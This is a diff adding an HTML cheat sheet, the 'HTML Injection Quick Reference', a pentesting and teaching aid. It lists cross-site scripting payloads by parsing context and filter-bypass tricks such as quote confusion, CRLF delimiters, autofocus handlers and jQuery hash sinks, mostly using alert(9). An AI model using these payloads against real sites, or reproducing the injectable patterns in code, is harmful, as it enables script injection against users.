@@ -1,0 +1,237 @@
+<!doctype html>
+<html>
+<head>
+<meta charset="utf-8">
+<title>HTML Injection Quick Reference</title>
+<script src="http://use.edgefonts.net/open-sans.js"></script>
+<script src="http://use.edgefonts.net/source-code-pro.js"></script>
+<style>
+body {
+  font-family: open-sans, sans-serif;
+}
+
+.payload {
+  color: red;
+  font-size: larger;
+}
+
+.placeholder {
+  color: gray;
+  font-style: italic;
+}
+
+.hiqr {
+  line-height: 2;
+}
+
+.hiqr td {
+  border-top: 1px solid #ededed;
+}
+
+.hiqr td, th {
+  padding-left: 4px;
+  padding-right: 4px;
+}
+
+.hiqr td.char, td.example {
+  font-family: source-code-pro, monospace;
+  white-space: nowrap;
+}
+
+.hiqr td.footnote {
+  font-size: smaller;
+}
+</style>
+</head>
+<body>
+<!--
+
+This work is licensed under the Creative Commons Attribution-NonCommercial-NoDerivs 3.0 Unported License. To view a copy of this license, visit http://creativecommons.org/licenses/by-nc-nd/3.0/.
+
+-->
+<h1>HTML Injection Quick Reference (HIQR)</h1>
+<div style="float:left">Mike Shema, <a href="http://deadliestwebattacks.com">Deadliest Web Attacks</a></div>
+<div style="float:right">Last Revision: 2012-12-04 [ <a href="https://github.com/mutantzombie/HIQR">HIQR @ GitHub</a> ]</div>
+<div id="hiqr_toc" style="clear:both">
+<br>
+<a href="#hiqr_table_1">Table 1</a>: Injection Techniques for Various Parsing Contexts<br>
+<a href="#hiqr_table_2">Table 2</a>: Payload Crafting Techniques to Bypass Filters and Data Validation
+<br>
+<br>
+</div>
+<table id="hiqr_table_1" class="hiqr">
+<caption>Injection Techniques for Various Parsing Contexts<a href="#html5_syntax"><sup>1</sup></a></caption>
+<thead>
+<tr>
+<th>Context
+<th>State
+<th>Injection Example
+<tbody>
+<tr>
+  <td rowspan="4">Data State<br>(Text node, open tag)
+  <td>
+  <td class="example">Welcome back, <span class="payload">&lt;script&gt;&#x2623;&lt;/script&gt;</span>...
+  <tr>
+  <td class="char">&lt;/<span class="placeholder">element</span>&gt;
+  <td class="example">&lt;title&gt;Search Results for '<span class="payload">&lt;/title&gt;&lt;script&gt;☣&lt;script&gt;</span>'&lt;/title&gt;
+  <tr>
+  <td class="char">--&gt;<sup><a href="#html5_comment">2</a></sup>
+  <td class="example">&lt;-- lorem ipsem<span class="payload">--&gt;&lt;script&gt;☣&lt;script&gt;</span>--&gt;
+  <tr>
+  <td class="char">]]&gt;
+  <td class="example">&lt;FOO&gt;&lt;![CDATA[<span class="payload">]]&gt;&lt;script&gt;&#x2623;&lt;/script&gt;</span>]]&gt;
+<tr>
+  <td rowspan="4">Attribute value
+  <td rowspan="2">Unquoted
+  <td class="example">&lt;input type=text name=foo value=<span class="payload">a&gt;&lt;script&gt;☣&lt;script&gt;</span>&gt;
+  <tr>
+  <td class="example">&lt;input type=text name=foo value=<span class="payload">a/&gt;&lt;script&gt;☣&lt;script&gt;</span>&gt;
+  <tr>
+  <td>Single-quoted<br>(U+0027)
+  <td class="example">&lt;input type=text name=foo value='<span class="payload">'onevent=☣//</span>'&gt;
+  <tr>
+  <td>Double-quoted<br>(U+0022)
+  <td class="example">&lt;input type=text name=foo value="<span class="payload">"onevent=☣//</span>"&gt;
+<tr>
+  <td rowspan="3">JavaScript variable assignment
+  <td>Unquoted
+  <td class="example">
+  <tr>
+  <td>Double-quoted<br>(U+0022)
+  <td class="example">&lt;script&gt;<br>var foo="<span class="payload">";☣;//</span>";<br>...
+  <tr>
+  <td>Single-quoted<br>(U+0027)
+  <td class="example">&lt;script&gt;<br>var foo='<span class="payload">';☣;//</span>';<br>...
+<tr>
+  <td rowspan="6">JavaScript Window.location object property<br><span class="placeholder">.hash<br>.href<br>.pathname<br>.search</span>
+  <td rowspan="2" class="char">URL
+  <td>http://web.site/page/<span class="payload">&lt;script&gt;☣&lt;script&gt;</span>
+  <tr>
+  <td class="example">&lt;script&gt;<br>document.write("Page not found: " + window.location);<br>...
+  <tr>
+  <td rowspan="2" class="char">#<span class="placeholder">fragment</span>
+  <td>http://web.site/page<span class="payload">#&lt;script&gt;☣&lt;script&gt;</span>
+  <tr>
+  <td class="example">&lt;script&gt;<br>document.write(window.location);<br>...
+  <tr>
+  <td rowspan="2" class="char">#<span class="placeholder">jQuery</span><sup><a href="#jquery_example">3</a></sup>
+  <td>http://web.site/page<span class="payload">#&lt;img/src=%22%22onerror=☣&gt;</span>
+  <tr>
+  <td class="example">&lt;script&gt;<br>$(document).ready(function() {<br>
+    &nbsp;&nbsp;var x = (window.location.hash.match(/^#([^\/].+)$/) || [])[1];<br>
+    &nbsp;&nbsp;var w = $('a[name="' + x + '"], [id="' + x + '"]');<br>
+  });
+<!--
+<tr>
+  <td rowspan="2">Alter MIME interpretation of uploaded file
+  <td>
+  <td>
+  <tr>
+  <td>
+  <td>
+-->
+<tr>
+  <th colspan="3">Footnotes
+<tr>
+  <td id="html5_syntax" colspan="3" class="footnote"><sup>1</sup> The biohazard symbol (U+2623) -- &#x2623; -- in each example represents a JavaScript payload. It could be anything from a while loop to DoS the browser, e.g. <span class="placeholder">var a;while(1){a+="a"}</span> to the ubiquitous <span class="placeholder">alert(9)</span>. These categories focus on the placement of the payload within the rendered document rather than the effect of the payload.
+<br>Though it seems daunting to review the <a href="http://www.w3.org/TR/html5/syntax.html#syntax">HTML5 syntax</a> specification, doing so aids in understanding how HTML is supposed to be formed. HTML5 defines an explicit algorithm for <a href="http://www.w3.org/TR/html5/parsing.html#parsing">parsing HTML documents</a>. Read through the spec to become familiar with the expectations of Unicode code points, parse errors, and decisions a User Agent may make when dealing with markup. A standardized approach to parsing is supposed to minimize the quirks and differences among browsers, thus removing a historical source of insecurity. The <a href="http://www.w3.org/TR/html401/">HTML4 spec</a> was not as clear or as rigourous on parsing.
+<tr>
+  <td id="html5_comment" colspan="3" class="footnote"><sup>2</sup> Sometimes it's helpful to insert a space before the --&gt; to ensure the tag is interpreted. [ <a href="http://www.w3.org/TR/html5/syntax.html#comments">HTML5 comments</a> ]
+<tr>
+  <td id="jquery_example" colspan="3" class="footnote"><sup>3</sup> This is a quirk of jQuery's design choice for overloading the <a href="http://api.jquery.com/jQuery/">$() API</a> to accept selectors or elements. Read about the interplay of JavaScript and Content Security Policy on the <a href="http://deadliestwebattacks.com/2012/10/31/javascript-is-harmless/">blog</a>.
+</table>
+<div align="right"><a href="#hiqr_toc">top</a></div>
+<hr>
+<table id="hiqr_table_2" class="hiqr">
+<caption>Payload Crafting Techniques to Bypass Filters and Data Validation</caption>
+<thead>
+<tr>
+<th>Concept
+<th>Notes
+<th>Payload Example
+<tbody>
+<tr>
+  <td rowspan="4">Alternate attribute delimiters
+  <td>Forward slash
+  <td class="example">&lt;img/src=""onerror=alert(9)&gt;
+  <tr>
+  <td rowspan="2">Dangling quoted string
+  <td class="example">&lt;a'' href'' onclick=alert(9)&gt;foo&lt;/a&gt;
+  <tr>
+  <td class="example">&lt;a"" href=""onclick=alert(9)&gt;foo&lt;/a&gt;
+  <tr>
+  <td>CRLF instead of space
+  <td class="example">&lt;img%0a%0dsrc=""%0a%0donerror=alert(9)&gt;
+<tr>
+  <td rowspan="4">JavaScript inline event handlers<a href="#csp_unsafe-inline"><sup>1</sup></a><br>[ <a href="http://www.w3.org/TR/html5/webappapis.html#event-handlers-on-elements,-document-objects,-and-window-objects">html5</a> <a href="http://www.w3.org/TR/html401/interact/scripts.html#h-18.2.3">html4</a> ]
+  <td>Unquoted
+  <td class="example">&lt;input type=text name=foo value=<span class="payload">a%20onchange=alert(9)</span>&gt;
+  <tr>
+  <td>Double-quoted
+  <td class="example">&lt;input type="text" name="foo" value="<span class="payload">"onmouseover=alert(9)//</span>"&gt;
+  <tr>
+  <td>Single-quoted
+  <td class="example">&lt;input type='text' name='foo' value='<span class="payload">'onclick=alert(9)//</span>'&gt;
+  <tr>
+  <td>HTML5 autofocus
+  <td class="example">&lt;input type="text" name="foo" value="<span class="payload">"autofocus/onfocus=alert(9)//</span>"&gt;
+<tr>
+  <td rowspan="6">Untidy markup
+  <td rowspan="2">Missing greater-than sign
+  <td class="example">&lt;script%0a%0dalert(9)&lt;/script&gt;
+  <tr>
+  <td class="example">&lt;script%20&lt;!--%20--&gt;alert(9)&lt;/script&gt;
+  <tr>
+  <td>Recover from syntax error
+  <td class="example">&lt;a href=""&amp;&lt;img&amp;amp;/onclick=alert(9)&gt;foo&lt;/a&gt;
+  <tr>
+  <td>Uncommon syntax
+  <td class="example">&lt;a""id=a href=''onclick=alert(9)&gt;foo&lt;/a&gt;
+  <tr>
+  <td>Orphan entity
+  <td class="example">&lt;a href=""&amp;amp;/onclick=alert(9)&gt;foo&lt;/a&gt;
+  <tr>
+  <td>Vestigal attribute
+  <td class="example">&lt;script/id="a"&gt;alert(9)&lt;/script&gt;
+<tr>
+  <td rowspan="11">Anti-regex patterns
+  <td>Element closed prematurely
+  <td class="example">&lt;img src="&gt;"onerror=alert(9)&gt;
+  <tr>
+  <td>Element confusion
+  <td class="example">&lt;img id="&gt;&lt;"class="&gt;&lt;"src="&gt;"onerror=alert(9)&gt;
+  <tr>
+  <td rowspan="4">Quote confusion
+  <td class="example">&lt;img src="\"a="&gt;"onerror=alert(9)&gt;
+  <tr>
+  <td class="example">&lt;a id=' href=""&gt;'href=javascript:alert(9)&gt;foo&lt;/a&gt;
+  <tr>
+  <td class="example">&lt;a id='href=http://web.site/'onclick=alert(9)&gt;foo&lt;/a&gt;
+  <tr>
+  <td class="example">&lt;a href= . '"\' onclick=alert(9) '"'&gt;foo&lt;/a&gt;
+  <tr>
+  <td rowspan="2">Quote confusion with element
+  <td class="example">&lt;img src="\"'&lt;a href='"&gt;"'onerror=alert(9)&gt;
+  <tr>
+  <td class="example">&lt;a id='http://web.site/'onclick=alert(9)&lt;!--href=a&gt;foo&lt;/a&gt;--&gt;
+  <tr>
+  <td>Quote mixing with element
+  <td class="example">&lt;img src="'"id='&lt;img src=""&gt;'onerror=alert(9)&gt;
+  <tr>
+  <td>Recursive elements
+  <td class="example">&lt;img src="&lt;img src='&lt;img src=.&gt;'&gt;"onerror=alert(9)&gt;
+  <tr>
+  <td>Repeated attributes (match last occurrence)<sup><a href="#html5_attribute_name_state">2</a></sup>
+  <td class="example">&lt;a href=javascript:alert(9) href href='' href=""&gt;foo&lt;/a&gt;
+<tr>
+  <th colspan="3">Footnotes
+<tr>
+  <td id="csp_unsafe-inline" colspan="3" class="footnote"><sup>1</sup> HTML5's Content Security Policy headers can neutralize these attacks by preventing the User Agent from executing JavaScript within this context unless the page author is forced to include the <a href="http://www.w3.org/TR/CSP/#directives">"unsafe-inline" directive</a>.
+<tr>
+  <td id="html5_attribute_name_state" colspan="3" class="footnote"><sup>2</sup> Per <a href="http://dev.w3.org/html5/spec/single-page.html#attribute-name-state">HTML5 spec</a>, <cite>"When the user agent leaves the attribute name state (and before emitting the tag token, if appropriate), the complete attribute's name must be compared to the other attributes on the same token; if there is already an attribute on the token with the exact same name, then this is a parse error and the new attribute must be dropped, along with the value that gets associated with it (if any)."</cite>
+</table>
+<div align="right"><a href="#hiqr_toc">top</a></div>
+<br>
+<a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.en_US"><img alt="Creative Commons License" style="border-width:0" src="http://i.creativecommons.org/l/by-nc-nd/3.0/88x31.png" /></a><br /><span xmlns:dct="http://purl.org/dc/terms/" property="dct:title">HIQR</span> by <a xmlns:cc="http://creativecommons.org/ns#" href="http://deadliestwebattacks.com/" property="cc:attributionName" rel="cc:attributionURL">Mike Shema</a> is licensed under a <a rel="license" href="http://creativecommons.org/licenses/by-nc-nd/3.0/deed.en_US">Creative Commons Attribution-NonCommercial-NoDerivs 3.0 Unported License</a>.
+</body>
+</html>
